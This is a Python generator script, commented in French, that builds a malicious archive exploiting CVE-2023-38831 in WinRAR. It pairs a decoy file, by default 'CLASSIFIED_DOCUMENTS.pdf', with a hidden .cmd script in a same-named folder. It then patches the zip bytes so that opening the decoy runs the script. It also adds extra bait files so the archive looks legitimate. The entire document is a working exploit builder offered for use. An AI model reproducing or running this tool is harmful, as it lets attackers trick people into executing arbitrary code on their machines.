import shutil
import os, sys
from os.path import join
TEMPLATE_NAME = "TEMPLATE"
OUTPUT_NAME = "CVE-2023-38831-poc.rar"

BAIT_NAME = "CLASSIFIED_DOCUMENTS.pdf"
SCRIPT_NAME = "script.bat"
BAIT_FILES = ""  #upgrade ici, represent un dossier contenant les fichier a rajoute pour rendre l'archove legit


if len(sys.argv) > 4:
    BAIT_NAME = os.path.basename(sys.argv[1])
    SCRIPT_NAME = os.path.basename(sys.argv[2])
    OUTPUT_NAME = os.path.basename(sys.argv[4])
    BAIT_FILES = os.path.basename(sys.argv[3]) #upgrade ici
elif len(sys.argv) == 2 and sys.argv[1] == "poc":
    pass
else:
    print("""Usage:
          python .\cve-2023-38831-exp-gen.py poc
          python .\cve-2023-38831-exp-gen.py <BAIT_NAME> <SCRIPT_NAME> <BAIT_FILES> <OUTPUT_NAME>""") #upgrade ici
    sys.exit()


BAIT_EXT = b"." + BAIT_NAME.split(".")[-1].encode("utf-8") # extention du fichier leurre en utf-8


print("BAIT_NAME:", BAIT_NAME)
print("SCRIPT_NAME:", SCRIPT_NAME)
print("OUTPUT_NAME:", OUTPUT_NAME)
print("BAITS_FILES:",BAIT_FILES) #upgrade ici

if os.path.exists(TEMPLATE_NAME):
    shutil.rmtree(TEMPLATE_NAME)# si le dossier Template existe deja on le supprimer
os.mkdir(TEMPLATE_NAME)         #creation du dossier template
d = join(TEMPLATE_NAME, BAIT_NAME + "A")
if not os.path.exists(d):
    os.mkdir(d) # si le dossier bait_name+A n'existe pas on le cree dans template

shutil.copyfile(join(SCRIPT_NAME), join(d, BAIT_NAME+"A.cmd")) # on copie le  script dans le dossier d et on le renomme bait_nameA.cmd
shutil.copyfile(join(BAIT_NAME), join(TEMPLATE_NAME, BAIT_NAME+"B")) # on copie le leurre dans le meme fichier mais avec B a la fin


for element in os.listdir(BAIT_FILES):  #upgrade ici , on va  copier tous les fichiers et doossier de BAIT_FILES dans TEMPLATE
     chemin_source = os.path.join(BAIT_FILES, element)
     chemin_destination = os.path.join(TEMPLATE_NAME, element)

     # Copie le fichier ou le dossier
     if os.path.isdir(chemin_source):
        shutil.copytree(chemin_source, chemin_destination)
     else:
        shutil.copy2(chemin_source, chemin_destination)


# if os.path.exists(OUTPUT_NAME):
#     print("!!! dir %s exists, delete it first" %(OUTPUT_NAME))
#     sys.exit()

shutil.make_archive(TEMPLATE_NAME, 'zip', TEMPLATE_NAME) #on cree l'archive zip a partir du dossier template

with open(TEMPLATE_NAME + ".zip", "rb") as f:
    content = f.read()  # on garde le contenu du dossier
    content = content.replace(BAIT_EXT + b"A", BAIT_EXT + b" ") # on changer les caracteres temporaire par un espace ( c'est ici que l'exploit prend forme)
    content = content.replace(BAIT_EXT + b"B", BAIT_EXT + b" ")

os.remove(TEMPLATE_NAME + ".zip") # supprime le dossier template.zip

with open(OUTPUT_NAME, "wb")  as f: # on met le contenu sauvegarder dans un nouveau dossier avec le nom souhaiter
    f.write(content)

print("ok..")

